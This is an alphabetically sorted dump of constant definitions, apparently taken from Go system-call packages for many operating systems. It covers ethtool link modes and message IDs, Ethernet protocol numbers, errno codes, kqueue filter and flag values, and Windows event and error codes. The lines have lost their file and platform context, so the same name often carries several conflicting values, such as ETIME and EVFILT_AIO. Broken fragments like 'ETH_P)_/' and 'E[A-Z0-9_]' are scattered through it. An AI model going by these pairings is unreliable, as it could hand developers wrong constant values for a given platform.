ETHTOOL_LINK_MODE_50000baseKR_Full_BIT                                  = 0x34
ETHTOOL_LINK_MODE_50000baseLR_ER_FR_Full_BIT                            = 0x37
ETHTOOL_LINK_MODE_50000baseSR2_Full_BIT                                 = 0x28
ETHTOOL_LINK_MODE_50000baseSR_Full_BIT                                  = 0x35
ETHTOOL_LINK_MODE_5000baseT_Full_BIT                                    = 0x30
ETHTOOL_LINK_MODE_56000baseCR4_Full_BIT                                 = 0x1c
ETHTOOL_LINK_MODE_56000baseKR4_Full_BIT                                 = 0x1b
ETHTOOL_LINK_MODE_56000baseLR4_Full_BIT                                 = 0x1e
ETHTOOL_LINK_MODE_56000baseSR4_Full_BIT                                 = 0x1d
ETHTOOL_LINK_MODE_AUI_BIT                                               = 0x8
ETHTOOL_LINK_MODE_Asym_Pause_BIT                                        = 0xe
ETHTOOL_LINK_MODE_Autoneg_BIT                                           = 0x6
ETHTOOL_LINK_MODE_BNC_BIT                                               = 0xb
ETHTOOL_LINK_MODE_Backplane_BIT                                         = 0x10
ETHTOOL_LINK_MODE_FEC_BASER_BIT                                         = 0x33
ETHTOOL_LINK_MODE_FEC_LLRS_BIT                                          = 0x4a
ETHTOOL_LINK_MODE_FEC_NONE_BIT                                          = 0x31
ETHTOOL_LINK_MODE_FEC_RS_BIT                                            = 0x32
ETHTOOL_LINK_MODE_FIBRE_BIT                                             = 0xa
ETHTOOL_LINK_MODE_MII_BIT                                               = 0x9
ETHTOOL_LINK_MODE_Pause_BIT                                             = 0xd
ETHTOOL_LINK_MODE_TP_BIT                                                = 0x7
ETHTOOL_MSG_CABLE_TEST_ACT                = 0x1a
ETHTOOL_MSG_CABLE_TEST_NTF                = 0x1b
ETHTOOL_MSG_CABLE_TEST_TDR_ACT            = 0x1b
ETHTOOL_MSG_CABLE_TEST_TDR_NTF            = 0x1c
ETHTOOL_MSG_CHANNELS_GET                  = 0x11
ETHTOOL_MSG_CHANNELS_GET_REPLY            = 0x12
ETHTOOL_MSG_CHANNELS_NTF                  = 0x13
ETHTOOL_MSG_CHANNELS_SET                  = 0x12
ETHTOOL_MSG_COALESCE_GET                  = 0x13
ETHTOOL_MSG_COALESCE_GET_REPLY            = 0x14
ETHTOOL_MSG_COALESCE_NTF                  = 0x15
ETHTOOL_MSG_COALESCE_SET                  = 0x14
ETHTOOL_MSG_DEBUG_GET                     = 0x7
ETHTOOL_MSG_DEBUG_GET_REPLY               = 0x7
ETHTOOL_MSG_DEBUG_NTF                     = 0x8
ETHTOOL_MSG_DEBUG_SET                     = 0x8
ETHTOOL_MSG_EEE_GET                       = 0x17
ETHTOOL_MSG_EEE_GET_REPLY                 = 0x18
ETHTOOL_MSG_EEE_NTF                       = 0x19
ETHTOOL_MSG_EEE_SET                       = 0x18
ETHTOOL_MSG_FEATURES_GET                  = 0xb
ETHTOOL_MSG_FEATURES_GET_REPLY            = 0xb
ETHTOOL_MSG_FEATURES_NTF                  = 0xd
ETHTOOL_MSG_FEATURES_SET                  = 0xc
ETHTOOL_MSG_FEATURES_SET_REPLY            = 0xc
ETHTOOL_MSG_FEC_GET                       = 0x1d
ETHTOOL_MSG_FEC_GET_REPLY                 = 0x1e
ETHTOOL_MSG_FEC_NTF                       = 0x1f
ETHTOOL_MSG_FEC_SET                       = 0x1e
ETHTOOL_MSG_KERNEL_MAX                    = 0x24
ETHTOOL_MSG_KERNEL_NONE                   = 0x0
ETHTOOL_MSG_LINKINFO_GET                  = 0x2
ETHTOOL_MSG_LINKINFO_GET_REPLY            = 0x2
ETHTOOL_MSG_LINKINFO_NTF                  = 0x3
ETHTOOL_MSG_LINKINFO_SET                  = 0x3
ETHTOOL_MSG_LINKMODES_GET                 = 0x4
ETHTOOL_MSG_LINKMODES_GET_REPLY           = 0x4
ETHTOOL_MSG_LINKMODES_NTF                 = 0x5
ETHTOOL_MSG_LINKMODES_SET                 = 0x5
ETHTOOL_MSG_LINKSTATE_GET                 = 0x6
ETHTOOL_MSG_LINKSTATE_GET_REPLY           = 0x6
ETHTOOL_MSG_MODULE_EEPROM_GET             = 0x1f
ETHTOOL_MSG_MODULE_EEPROM_GET_REPLY       = 0x20
ETHTOOL_MSG_MODULE_GET                    = 0x22
ETHTOOL_MSG_MODULE_GET_REPLY              = 0x23
ETHTOOL_MSG_MODULE_NTF                    = 0x24
ETHTOOL_MSG_MODULE_SET                    = 0x23
ETHTOOL_MSG_PAUSE_GET                     = 0x15
ETHTOOL_MSG_PAUSE_GET_REPLY               = 0x16
ETHTOOL_MSG_PAUSE_NTF                     = 0x17
ETHTOOL_MSG_PAUSE_SET                     = 0x16
ETHTOOL_MSG_PHC_VCLOCKS_GET               = 0x21
ETHTOOL_MSG_PHC_VCLOCKS_GET_REPLY         = 0x22
ETHTOOL_MSG_PRIVFLAGS_GET                 = 0xd
ETHTOOL_MSG_PRIVFLAGS_GET_REPLY           = 0xe
ETHTOOL_MSG_PRIVFLAGS_NTF                 = 0xf
ETHTOOL_MSG_PRIVFLAGS_SET                 = 0xe
ETHTOOL_MSG_RINGS_GET                     = 0xf
ETHTOOL_MSG_RINGS_GET_REPLY               = 0x10
ETHTOOL_MSG_RINGS_NTF                     = 0x11
ETHTOOL_MSG_RINGS_SET                     = 0x10
ETHTOOL_MSG_STATS_GET                     = 0x20
ETHTOOL_MSG_STATS_GET_REPLY               = 0x21
ETHTOOL_MSG_STRSET_GET                    = 0x1
ETHTOOL_MSG_STRSET_GET_REPLY              = 0x1
ETHTOOL_MSG_TSINFO_GET                    = 0x19
ETHTOOL_MSG_TSINFO_GET_REPLY              = 0x1a
ETHTOOL_MSG_TUNNEL_INFO_GET               = 0x1c
ETHTOOL_MSG_TUNNEL_INFO_GET_REPLY         = 0x1d
ETHTOOL_MSG_USER_MAX                      = 0x23
ETHTOOL_MSG_USER_NONE                     = 0x0
ETHTOOL_MSG_WOL_GET                       = 0x9
ETHTOOL_MSG_WOL_GET_REPLY                 = 0x9
ETHTOOL_MSG_WOL_NTF                       = 0xa
ETHTOOL_MSG_WOL_SET                       = 0xa
ETHTOOL_NWAY_RST                            = 0x9
ETHTOOL_PERQUEUE                            = 0x4b
ETHTOOL_PFC_PREVENTION_TOUT                                             = 0x3
ETHTOOL_PHYS_ID                             = 0x1c
ETHTOOL_PHY_DOWNSHIFT                                                   = 0x1
ETHTOOL_PHY_EDPD                                                        = 0x3
ETHTOOL_PHY_EDPD_DFLT_TX_MSECS              = 0xffff
ETHTOOL_PHY_EDPD_DISABLE                    = 0x0
ETHTOOL_PHY_EDPD_NO_TX                      = 0xfffe
ETHTOOL_PHY_FAST_LINK_DOWN                                              = 0x2
ETHTOOL_PHY_FAST_LINK_DOWN_OFF              = 0xff
ETHTOOL_PHY_FAST_LINK_DOWN_ON               = 0x0
ETHTOOL_PHY_GTUNABLE                        = 0x4e
ETHTOOL_PHY_ID_UNSPEC                                                   = 0x0
ETHTOOL_PHY_STUNABLE                        = 0x4f
ETHTOOL_RESET                               = 0x34
ETHTOOL_RXNTUPLE_ACTION_CLEAR               = -0x2
ETHTOOL_RXNTUPLE_ACTION_DROP                = -0x1
ETHTOOL_RX_COPYBREAK                                                    = 0x1
ETHTOOL_RX_FLOW_SPEC_RING                   = 0xffffffff
ETHTOOL_RX_FLOW_SPEC_RING_VF                = 0xff00000000
ETHTOOL_RX_FLOW_SPEC_RING_VF_OFF            = 0x20
ETHTOOL_SCHANNELS                           = 0x3d
ETHTOOL_SCOALESCE                           = 0xf
ETHTOOL_SEEE                                = 0x45
ETHTOOL_SEEPROM                             = 0xc
ETHTOOL_SET_DUMP                            = 0x3e
ETHTOOL_SFEATURES                           = 0x3b
ETHTOOL_SFECPARAM                           = 0x51
ETHTOOL_SFLAGS                              = 0x26
ETHTOOL_SGRO                                = 0x2c
ETHTOOL_SGSO                                = 0x24
ETHTOOL_SLINKSETTINGS                       = 0x4d
ETHTOOL_SMSGLVL                             = 0x8
ETHTOOL_SPAUSEPARAM                         = 0x13
ETHTOOL_SPFLAGS                             = 0x28
ETHTOOL_SRINGPARAM                          = 0x11
ETHTOOL_SRSSH                               = 0x47
ETHTOOL_SRXCLSRLDEL                         = 0x31
ETHTOOL_SRXCLSRLINS                         = 0x32
ETHTOOL_SRXCSUM                             = 0x15
ETHTOOL_SRXFH                               = 0x2a
ETHTOOL_SRXFHINDIR                          = 0x39
ETHTOOL_SRXNTUPLE                           = 0x35
ETHTOOL_SSET                                = 0x2
ETHTOOL_SSG                                 = 0x19
ETHTOOL_STSO                                = 0x1f
ETHTOOL_STUNABLE                            = 0x49
ETHTOOL_STXCSUM                             = 0x17
ETHTOOL_SUFO                                = 0x22
ETHTOOL_SWOL                                = 0x6
ETHTOOL_TEST                                = 0x1a
ETHTOOL_TUNABLE_S16                                                     = 0x7
ETHTOOL_TUNABLE_S32                                                     = 0x8
ETHTOOL_TUNABLE_S64                                                     = 0x9
ETHTOOL_TUNABLE_S8                                                      = 0x6
ETHTOOL_TUNABLE_STRING                                                  = 0x5
ETHTOOL_TUNABLE_U16                                                     = 0x2
ETHTOOL_TUNABLE_U32                                                     = 0x3
ETHTOOL_TUNABLE_U64                                                     = 0x4
ETHTOOL_TUNABLE_U8                                                      = 0x1
ETHTOOL_TUNABLE_UNSPEC                                                  = 0x0
ETHTOOL_TX_COPYBREAK                                                    = 0x2
ETHTOOL_UDP_TUNNEL_TYPE_GENEVE            = 0x1
ETHTOOL_UDP_TUNNEL_TYPE_VXLAN             = 0x0
ETHTOOL_UDP_TUNNEL_TYPE_VXLAN_GPE         = 0x2
ETH_/ 
ETH_P
ETH_P)_/ 
ETH_P_1588                                  = 0x88f7
ETH_P_8021AD                                = 0x88a8
ETH_P_8021AH                                = 0x88e7
ETH_P_8021Q                                 = 0x8100
ETH_P_80221                                 = 0x8917
ETH_P_802_2                                 = 0x4
ETH_P_802_3                                 = 0x1
ETH_P_802_3_MIN                             = 0x600
ETH_P_802_EX1                               = 0x88b5
ETH_P_AARP                                  = 0x80f3
ETH_P_AF_IUCV                               = 0xfbfb
ETH_P_ALL                                   = 0x3
ETH_P_AOE                                   = 0x88a2
ETH_P_ARCNET                                = 0x1a
ETH_P_ARP                                   = 0x806
ETH_P_ATALK                                 = 0x809b
ETH_P_ATMFATE                               = 0x8884
ETH_P_ATMMPOA                               = 0x884c
ETH_P_AX25                                  = 0x2
ETH_P_BATMAN                                = 0x4305
ETH_P_BPQ                                   = 0x8ff
ETH_P_CAIF                                  = 0xf7
ETH_P_CAN                                   = 0xc
ETH_P_CANFD                                 = 0xd
ETH_P_CFM                                   = 0x8902
ETH_P_CONTROL                               = 0x16
ETH_P_CUST                                  = 0x6006
ETH_P_DDCMP                                 = 0x6
ETH_P_DEC                                   = 0x6000
ETH_P_DIAG                                  = 0x6005
ETH_P_DNA_DL                                = 0x6001
ETH_P_DNA_RC                                = 0x6002
ETH_P_DNA_RT                                = 0x6003
ETH_P_DSA                                   = 0x1b
ETH_P_DSA_8021Q                             = 0xdadb
ETH_P_ECONET                                = 0x18
ETH_P_EDSA                                  = 0xdada
ETH_P_ERSPAN                                = 0x88be
ETH_P_ERSPAN2                               = 0x22eb
ETH_P_ETHERCAT                              = 0x88a4
ETH_P_FCOE                                  = 0x8906
ETH_P_FIP                                   = 0x8914
ETH_P_HDLC                                  = 0x19
ETH_P_HSR                                   = 0x892f
ETH_P_IBOE                                  = 0x8915
ETH_P_IEEE802154                            = 0xf6
ETH_P_IEEEPUP                               = 0xa00
ETH_P_IEEEPUPAT                             = 0xa01
ETH_P_IFE                                   = 0xed3e
ETH_P_IP                                    = 0x800
ETH_P_IPV6                                  = 0x86dd
ETH_P_IPX                                   = 0x8137
ETH_P_IRDA                                  = 0x17
ETH_P_LAT                                   = 0x6004
ETH_P_LINK_CTL                              = 0x886c
ETH_P_LLDP                                  = 0x88cc
ETH_P_LOCALTALK                             = 0x9
ETH_P_LOOP                                  = 0x60
ETH_P_LOOPBACK                              = 0x9000
ETH_P_MACSEC                                = 0x88e5
ETH_P_MAP                                   = 0xf9
ETH_P_MCTP                                  = 0xfa
ETH_P_MOBITEX                               = 0x15
ETH_P_MPLS_MC                               = 0x8848
ETH_P_MPLS_UC                               = 0x8847
ETH_P_MRP                                   = 0x88e3
ETH_P_MVRP                                  = 0x88f5
ETH_P_NCSI                                  = 0x88f8
ETH_P_NSH                                   = 0x894f
ETH_P_PAE                                   = 0x888e
ETH_P_PAUSE                                 = 0x8808
ETH_P_PHONET                                = 0xf5
ETH_P_PPPTALK                               = 0x10
ETH_P_PPP_DISC                              = 0x8863
ETH_P_PPP_MP                                = 0x8
ETH_P_PPP_SES                               = 0x8864
ETH_P_PREAUTH                               = 0x88c7
ETH_P_PROFINET                              = 0x8892
ETH_P_PRP                                   = 0x88fb
ETH_P_PUP                                   = 0x200
ETH_P_PUPAT                                 = 0x201
ETH_P_QINQ1                                 = 0x9100
ETH_P_QINQ2                                 = 0x9200
ETH_P_QINQ3                                 = 0x9300
ETH_P_RARP                                  = 0x8035
ETH_P_REALTEK                               = 0x8899
ETH_P_SCA                                   = 0x6007
ETH_P_SLOW                                  = 0x8809
ETH_P_SNAP                                  = 0x5
ETH_P_TDLS                                  = 0x890d
ETH_P_TEB                                   = 0x6558
ETH_P_TIPC                                  = 0x88ca
ETH_P_TRAILER                               = 0x1c
ETH_P_TR_802_2                              = 0x11
ETH_P_TSN                                   = 0x22f0
ETH_P_WAN_PPP                               = 0x7
ETH_P_WCCP                                  = 0x883e
ETH_P_X25                                   = 0x805
ETH_P_XDSA                                  = 0xf8
ETIME              = Errno(1137)
ETIME           = syscall.Errno(0x3e)
ETIME           = syscall.Errno(0x49)
ETIME           = syscall.Errno(0x5c)
ETIME           = syscall.Errno(0x65)
ETIME           = syscall.Errno(0x77)
ETIMEDOUT          = Errno(1127)
ETIMEDOUT       = syscall.Errno(0x3c)
ETIMEDOUT       = syscall.Errno(0x4e)
ETIMEDOUT       = syscall.Errno(0x6e)
ETIMEDOUT       = syscall.Errno(0x91)
ETOOMANYREFS       = Errno(1126)
ETOOMANYREFS    = syscall.Errno(0x3b)
ETOOMANYREFS    = syscall.Errno(0x6d)
ETOOMANYREFS    = syscall.Errno(0x73)
ETOOMANYREFS    = syscall.Errno(0x90)
ETXTBSY            = Errno(1101)
ETXTBSY         = syscall.Errno(0x1a)
ETXTBSY     = syscall.Errno(0x1a)
EUCLEAN         = syscall.Errno(0x75)
EUCLEAN         = syscall.Errno(0x87)
EUNATCH         = syscall.Errno(0x2a)
EUNATCH         = syscall.Errno(0x31)
EUNATCH         = syscall.Errno(0x63)
EUNKNOWN           = Errno(246)
EUSERS             = Errno(1132)
EUSERS          = syscall.Errno(0x44)
EUSERS          = syscall.Errno(0x54)
EUSERS          = syscall.Errno(0x57)
EUSERS          = syscall.Errno(0x5e)
EVENP                         = 0x80
EVENTLOG_AUDIT_FAILURE    = 16
EVENTLOG_AUDIT_SUCCESS    = 8
EVENTLOG_ERROR_TYPE       = 1
EVENTLOG_INFORMATION_TYPE = 4
EVENTLOG_SUCCESS          = 0
EVENTLOG_WARNING_TYPE     = 2
EVENT_ALL_ACCESS   = STANDARD_RIGHTS_REQUIRED 
EVENT_E_ALL_SUBSCRIBERS_FAILED                                            Handle        = 0x80040201
EVENT_E_CANT_MODIFY_OR_DELETE_CONFIGURED_OBJECT                           Handle        = 0x8004020E
EVENT_E_CANT_MODIFY_OR_DELETE_UNCONFIGURED_OBJECT                         Handle        = 0x8004020D
EVENT_E_COMPLUS_NOT_INSTALLED                                             Handle        = 0x8004020C
EVENT_E_FIRST                                                             syscall.Errno = 0x80040200
EVENT_E_INTERNALERROR                                                     Handle        = 0x80040206
EVENT_E_INTERNALEXCEPTION                                                 Handle        = 0x80040205
EVENT_E_INVALID_EVENT_CLASS_PARTITION                                     Handle        = 0x8004020F
EVENT_E_INVALID_PER_USER_SID                                              Handle        = 0x80040207
EVENT_E_LAST                                                              syscall.Errno = 0x8004021F
EVENT_E_MISSING_EVENTCLASS                                                Handle        = 0x8004020A
EVENT_E_NOT_ALL_REMOVED                                                   Handle        = 0x8004020B
EVENT_E_PER_USER_SID_NOT_LOGGED_ON                                        Handle        = 0x80040210
EVENT_E_QUERYFIELD                                                        Handle        = 0x80040204
EVENT_E_QUERYSYNTAX                                                       Handle        = 0x80040203
EVENT_E_TOO_MANY_METHODS                                                  Handle        = 0x80040209
EVENT_E_USER_EXCEPTION                                                    Handle        = 0x80040208
EVENT_MODIFY_STATE = 0x0002
EVENT_S_FIRST                                                             syscall.Errno = 0x00040200
EVENT_S_LAST                                                              syscall.Errno = 0x0004021F
EVENT_S_NOSUBSCRIBERS                                                     Handle        = 0x00040202
EVENT_S_SOME_SUBSCRIBERS_FAILED                                           Handle        = 0x00040200
EVFILT
EVFILT_AIO                              = -0x3
EVFILT_AIO                        = -0x3
EVFILT_AIO                        = 0x2
EVFILT_AIO                     = -0x3
EVFILT_DEVICE                     = -0x8
EVFILT_EMPTY                   = -0xd
EVFILT_EXCEPT                           = -0xf
EVFILT_EXCEPT                     = -0x8
EVFILT_FS                               = -0x9
EVFILT_FS                         = -0xa
EVFILT_FS                      = -0x9
EVFILT_LIO                     = -0xa
EVFILT_MACHPORT                         = -0x8
EVFILT_MARKER                     = 0xf
EVFILT_PROC                             = -0x5
EVFILT_PROC                       = -0x5
EVFILT_PROC                       = 0x4
EVFILT_PROC                    = -0x5
EVFILT_PROCDESC                = -0x8
EVFILT_READ                             = -0x1
EVFILT_READ                       = -0x1
EVFILT_READ                       = 0x0
EVFILT_READ                    = -0x1
EVFILT_SENDFILE                = -0xc
EVFILT_SIGNAL                           = -0x6
EVFILT_SIGNAL                     = -0x6
EVFILT_SIGNAL                     = 0x5
EVFILT_SIGNAL                  = -0x6
EVFILT_SYSCOUNT                         = 0x11
EVFILT_SYSCOUNT                   = 0x7
EVFILT_SYSCOUNT                   = 0x8
EVFILT_SYSCOUNT                   = 0xa
EVFILT_SYSCOUNT                = 0xc
EVFILT_SYSCOUNT                = 0xd
EVFILT_THREADMARKER                     = 0x11
EVFILT_TIMER                            = -0x7
EVFILT_TIMER                      = -0x7
EVFILT_TIMER                      = 0x6
EVFILT_TIMER                   = -0x7
EVFILT_USER                             = -0xa
EVFILT_USER                       = -0x9
EVFILT_USER                    = -0xb
EVFILT_VM                               = -0xc
EVFILT_VNODE                            = -0x4
EVFILT_VNODE                      = -0x4
EVFILT_VNODE                      = 0x3
EVFILT_VNODE                   = -0x4
EVFILT_WRITE                            = -0x2
EVFILT_WRITE                      = -0x2
EVFILT_WRITE                      = 0x1
EVFILT_WRITE                   = -0x2
EVIOC/ 
EVL_ENCAPLEN                      = 0x4
EVL_PRIO_BITS                     = 0xd
EVL_PRIO_MAX                      = 0x7
EVL_VLID_MASK                     = 0xfff
EVL_VLID_MAX                      = 0xffe
EVL_VLID_MIN                      = 0x1
EVL_VLID_NULL                     = 0x0
EVNAMEMAP_NAME_SIZE            = 0x40
EV_ABS                                      = 0x3
EV_ADD                                  = 0x1
EV_ADD                            = 0x1
EV_ADD                         = 0x1
EV_CLEAR                                = 0x20
EV_CLEAR                          = 0x20
EV_CLEAR                       = 0x20
EV_CNT                                      = 0x20
EV_DELETE                               = 0x2
EV_DELETE                         = 0x2
EV_DELETE                      = 0x2
EV_DISABLE                              = 0x8
EV_DISABLE                        = 0x8
EV_DISABLE                     = 0x8
EV_DISPATCH                             = 0x80
EV_DISPATCH                       = 0x80
EV_DISPATCH                    = 0x80
EV_DISPATCH2                            = 0x180
EV_DROP                        = 0x1000
EV_ENABLE                               = 0x4
EV_ENABLE                         = 0x4
EV_ENABLE                      = 0x4
EV_EOF                                  = 0x8000
EV_EOF                            = 0x8000
EV_EOF                         = 0x8000
EV_ERROR                                = 0x4000
EV_ERROR                          = 0x4000
EV_ERROR                       = 0x4000
EV_FF                                       = 0x15
EV_FF_STATUS                                = 0x17
EV_FLAG0                                = 0x1000
EV_FLAG1                                = 0x2000
EV_FLAG1                          = 0x2000
EV_FLAG1                       = 0x2000
EV_FLAG2                       = 0x4000
EV_FORCEONESHOT                = 0x100
EV_HUP                            = 0x800
EV_KEY                                      = 0x1
EV_LED                                      = 0x11
EV_MAX                                      = 0x1f
EV_MSC                                      = 0x4
EV_NODATA                         = 0x1000
EV_ONESHOT                              = 0x10
EV_ONESHOT                        = 0x10
EV_ONESHOT                     = 0x10
EV_OOBAND                               = 0x2000
EV_POLL                                 = 0x1000
EV_PWR                                      = 0x16
EV_RECEIPT                              = 0x40
EV_RECEIPT                        = 0x40
EV_RECEIPT                     = 0x40
EV_REL                                      = 0x2
EV_REP                                      = 0x14
EV_SND                                      = 0x12
EV_SW                                       = 0x5
EV_SYN                                      = 0x0
EV_SYSFLAGS                             = 0xf000
EV_SYSFLAGS                       = 0xf000
EV_SYSFLAGS                       = 0xf800
EV_SYSFLAGS                    = 0xf000
EV_UDATA_SPECIFIC                       = 0x100
EV_VANISHED                             = 0x200
EV_VERSION                                  = 0x10001
EWOULDBLOCK        = Errno(1102)
EWOULDBLOCK     = syscall.Errno(0x23)
EWOULDBLOCK     = syscall.Errno(0xb)
EWOULDBLOCK = syscall.Errno(0xb)
EWRPROTECT      = syscall.Errno(0x2f)
EWX_BOOTOPTIONS     = 0x01000000
EWX_FORCE           = 0x00000004
EWX_FORCEIFHUNG     = 0x00000010
EWX_HYBRID_SHUTDOWN = 0x00400000
EWX_LOGOFF          = 0x00000000
EWX_POWEROFF        = 0x00000008
EWX_QUICKRESOLVE    = 0x00000020
EWX_REBOOT          = 0x00000002
EWX_RESTARTAPPS     = 0x00000040
EWX_SHUTDOWN        = 0x00000001
EXABYTE_ENABLE_NEST                         = 0xf0
EXCEPTION_SPAPI_UNRECOVERABLE_STACK_OVERFLOW Errno = ERROR_UNRECOVERABLE_STACK_OVERFLOW
EXCONTINUE                    = 0x0
EXDEV              = Errno(144)
EXDEV           = syscall.Errno(0x12)
EXDEV       = syscall.Errno(0x12)
EXDLOK                        = 0x3
EXFAT_SUPER_MAGIC                           = 0x2011bab0
EXFULL          = syscall.Errno(0x34)
EXFULL          = syscall.Errno(0x36)
EXFULL          = syscall.Errno(0x68)
EXIO                          = 0x2
EXPGIO                        = 0x0
EXPLICIT_ACCESS
EXPR_/ 
EXRESUME                      = 0x2
EXRETURN                      = 0x1
EXSIG                         = 0x4
EXT2_SUPER_MAGIC                            = 0xef53
EXT3_SUPER_MAGIC                            = 0xef53
EXT4_SUPER_MAGIC                            = 0xef53
EXTA                                        = 0xe
EXTA                                    = 0x4b00
EXTA                              = 0x4b00
EXTA                           = 0x4b00
EXTA                          = 0xe
EXTATTR_CMD_START                 = 0x1
EXTATTR_CMD_STOP                  = 0x2
EXTATTR_MAXNAMELEN             = 0xff
EXTATTR_NAMESPACE_EMPTY        = 0x0
EXTATTR_NAMESPACE_NAMES/ 
EXTATTR_NAMESPACE_SYSTEM          = 0x2
EXTATTR_NAMESPACE_SYSTEM       = 0x2
EXTATTR_NAMESPACE_USER            = 0x1
EXTATTR_NAMESPACE_USER         = 0x1
EXTATTR_NAMESPACE_[A-Z]
EXTB                                        = 0xf
EXTB                                    = 0x9600
EXTB                              = 0x9600
EXTB                           = 0x9600
EXTB                          = 0xf
EXTEN
EXTENDED_STARTUPINFO_PRESENT     = 0x00080000
EXTEXIT_LWP                       = 0x10000
EXTEXIT_PROC                      = 0x0
EXTEXIT_SETINT                    = 0x1
EXTEXIT_SIMPLE                    = 0x0
EXTPROC                                 = 0x800
EXTPROC                           = 0x800
EXTPROC                          = 0x10000
EXTPROC                          = 0x10000000
EXTPROC                        = 0x800
EXTRAP                        = 0x1
EXTRA_MAGIC                      = 0x45585401
EYEC_RTENTRYA                 = 0x257274656e747241
EYEC_RTENTRYF                 = 0x257274656e747246
EZBNMIF4 := svcLoad(
E[A-Z0-9_]
E_ABORT                                                                   Handle        = 0x80004004
E_ACC                         = 0x0
E_ACCESSDENIED                                                            Handle        = 0x80070005
E_APPLICATION_ACTIVATION_EXEC_FAILURE                                     Handle        = 0x8027025B
E_APPLICATION_ACTIVATION_TIMED_OUT                                        Handle        = 0x8027025A
E_APPLICATION_EXITING                                                     Handle        = 0x8000001A
E_APPLICATION_MANAGER_NOT_RUNNING                                         Handle        = 0x80270257
E_APPLICATION_NOT_REGISTERED                                              Handle        = 0x80270254
E_APPLICATION_TEMPORARY_LICENSE_ERROR                                     Handle        = 0x8027025C
E_APPLICATION_TRIAL_LICENSE_EXPIRED                                       Handle        = 0x8027025D
E_APPLICATION_VIEW_EXITING                                                Handle        = 0x8000001B
E_ASYNC_OPERATION_NOT_STARTED                                             Handle        = 0x80000019
E_AUDIO_ENGINE_NODE_NOT_FOUND                                             Handle        = 0x80660001
E_BLUETOOTH_ATT_ATTRIBUTE_NOT_FOUND                                       Handle        = 0x8065000A
E_BLUETOOTH_ATT_ATTRIBUTE_NOT_LONG                                        Handle        = 0x8065000B
E_BLUETOOTH_ATT_INSUFFICIENT_AUTHENTICATION                               Handle        = 0x80650005
E_BLUETOOTH_ATT_INSUFFICIENT_AUTHORIZATION                                Handle        = 0x80650008
E_BLUETOOTH_ATT_INSUFFICIENT_ENCRYPTION                                   Handle        = 0x8065000F
E_BLUETOOTH_ATT_INSUFFICIENT_ENCRYPTION_KEY_SIZE                          Handle        = 0x8065000C
E_BLUETOOTH_ATT_INSUFFICIENT_RESOURCES                                    Handle        = 0x80650011
E_BLUETOOTH_ATT_INVALID_ATTRIBUTE_VALUE_LENGTH                            Handle        = 0x8065000D
E_BLUETOOTH_ATT_INVALID_HANDLE                                            Handle        = 0x80650001
E_BLUETOOTH_ATT_INVALID_OFFSET                                            Handle        = 0x80650007
E_BLUETOOTH_ATT_INVALID_PDU                                               Handle        = 0x80650004
E_BLUETOOTH_ATT_PREPARE_QUEUE_FULL                                        Handle        = 0x80650009
E_BLUETOOTH_ATT_READ_NOT_PERMITTED                                        Handle        = 0x80650002
E_BLUETOOTH_ATT_REQUEST_NOT_SUPPORTED                                     Handle        = 0x80650006
E_BLUETOOTH_ATT_UNKNOWN_ERROR                                             Handle        = 0x80651000
E_BLUETOOTH_ATT_UNLIKELY                                                  Handle        = 0x8065000E
E_BLUETOOTH_ATT_UNSUPPORTED_GROUP_TYPE                                    Handle        = 0x80650010
E_BLUETOOTH_ATT_WRITE_NOT_PERMITTED                                       Handle        = 0x80650003
E_BOUNDS                                                                  Handle        = 0x8000000B
E_CHANGED_STATE                                                           Handle        = 0x8000000C
E_ELEVATED_ACTIVATION_NOT_SUPPORTED                                       Handle        = 0x80270251
E_FAIL                                                                    Handle        = 0x80004005
E_FULL_ADMIN_NOT_SUPPORTED                                                Handle        = 0x80270253
E_HANDLE                                                                  Handle        = 0x80070006
E_HDAUDIO_CONNECTION_LIST_NOT_SUPPORTED                                   Handle        = 0x80660003
E_HDAUDIO_EMPTY_CONNECTION_LIST                                           Handle        = 0x80660002
E_HDAUDIO_NO_LOGICAL_DEVICES_CREATED                                      Handle        = 0x80660004
E_HDAUDIO_NULL_LINKED_LIST_ENTRY                                          Handle        = 0x80660005
E_ILLEGAL_DELEGATE_ASSIGNMENT                                             Handle        = 0x80000018
E_ILLEGAL_METHOD_CALL                                                     Handle        = 0x8000000E
E_ILLEGAL_STATE_CHANGE                                                    Handle        = 0x8000000D
E_INVALIDARG                                                              Handle        = 0x80070057
E_INVALID_PROTOCOL_FORMAT                                                 Handle        = 0x83760002
E_INVALID_PROTOCOL_OPERATION                                              Handle        = 0x83760001
E_MBN_BAD_SIM                                                             Handle        = 0x80548202
E_MBN_CONTEXT_NOT_ACTIVATED                                               Handle        = 0x80548201
E_MBN_DATA_CLASS_NOT_AVAILABLE                                            Handle        = 0x80548203
E_MBN_DEFAULT_PROFILE_EXIST                                               Handle        = 0x80548219
E_MBN_FAILURE                                                             Handle        = 0x80548212
E_MBN_INVALID_ACCESS_STRING                                               Handle        = 0x80548204
E_MBN_INVALID_CACHE                                                       Handle        = 0x8054820C
E_MBN_INVALID_PROFILE                                                     Handle        = 0x80548218
E_MBN_MAX_ACTIVATED_CONTEXTS                                              Handle        = 0x80548205
E_MBN_NOT_REGISTERED                                                      Handle        = 0x8054820D
E_MBN_PACKET_SVC_DETACHED                                                 Handle        = 0x80548206
E_MBN_PIN_DISABLED                                                        Handle        = 0x80548211
E_MBN_PIN_NOT_SUPPORTED                                                   Handle        = 0x8054820F
E_MBN_PIN_REQUIRED                                                        Handle        = 0x80548210
E_MBN_PROVIDERS_NOT_FOUND                                                 Handle        = 0x8054820E
E_MBN_PROVIDER_NOT_VISIBLE                                                Handle        = 0x80548207
E_MBN_RADIO_POWER_OFF                                                     Handle        = 0x80548208
E_MBN_SERVICE_NOT_ACTIVATED                                               Handle        = 0x80548209
E_MBN_SIM_NOT_INSERTED                                                    Handle        = 0x8054820A
E_MBN_SMS_ENCODING_NOT_SUPPORTED                                          Handle        = 0x80548220
E_MBN_SMS_FILTER_NOT_SUPPORTED                                            Handle        = 0x80548221
E_MBN_SMS_FORMAT_NOT_SUPPORTED                                            Handle        = 0x80548227
E_MBN_SMS_INVALID_MEMORY_INDEX                                            Handle        = 0x80548222
E_MBN_SMS_LANG_NOT_SUPPORTED                                              Handle        = 0x80548223
E_MBN_SMS_MEMORY_FAILURE                                                  Handle        = 0x80548224
E_MBN_SMS_MEMORY_FULL                                                     Handle        = 0x80548229
E_MBN_SMS_NETWORK_TIMEOUT                                                 Handle        = 0x80548225
E_MBN_SMS_OPERATION_NOT_ALLOWED                                           Handle        = 0x80548228
E_MBN_SMS_UNKNOWN_SMSC_ADDRESS                                            Handle        = 0x80548226
E_MBN_VOICE_CALL_IN_PROGRESS                                              Handle        = 0x8054820B
E_MONITOR_RESOLUTION_TOO_LOW                                              Handle        = 0x80270250
